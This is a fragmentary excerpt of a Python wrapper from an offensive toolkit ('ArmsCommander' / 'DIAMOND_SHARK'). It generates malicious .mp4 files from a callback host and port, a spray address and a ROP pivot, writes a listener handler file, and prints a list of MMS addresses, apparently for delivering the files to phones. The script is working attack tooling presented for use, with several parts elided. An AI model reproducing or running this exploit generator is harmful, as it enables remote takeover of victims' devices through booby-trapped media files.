...
# sample command
# python /root/ArmsCommander/DIAMOND_SHARK/mp4.py -c <callback HOST> -p <callback PORT> -s <OPTIONAL spray address> -r <ROP pivot> -o <OUTPUT file .mp4>
os.system('cat /root/ArmsCommander/DIAMOND_SHARK/Banner-And-DS-HowTo.txt')
...
def GENERATE_payload():
    ...
    basic_Output_Directory = "/root/ArmsCommander/DIAMOND_SHARK/payload/"
    named_Output_Directory = basic_Output_Directory + output_File + '.mp4'
    cmd_String = "python /root/ArmsCommander/DIAMOND_SHARK/mp4.py -c %s -p %s -o %s" % (call_Host, call_Port, named_Output_Directory)
    ...
    handler = open('/root/ArmsCommander/DIAMOND_SHARK/payload/handler_file.rc','w')
...
def PRINT_all_MMS_addresses():
    os.system('cat /root/ArmsCommander/DIAMOND_SHARK/allMMSAddresses.txt')
    main()
    return
